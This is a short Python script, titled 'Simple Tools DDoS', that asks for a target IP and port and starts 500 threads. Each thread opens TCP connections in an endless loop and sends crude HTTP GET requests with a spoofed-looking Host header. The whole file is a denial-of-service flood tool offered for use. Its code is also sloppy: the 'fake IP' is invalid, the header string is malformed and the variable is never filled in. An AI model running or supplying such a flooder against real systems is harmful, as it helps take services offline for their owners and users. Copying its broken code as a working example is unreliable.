# Simple Tools
# Author : VANKZ

import socket
import threading

print("Simple Tools DDoS\n")
target = input("[?] Enter IP Target : ")
port = int(input("[?] Enter The Port : "))

fake_ip = '123.456.789'

already_connected = 0

def attack():
    while  True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()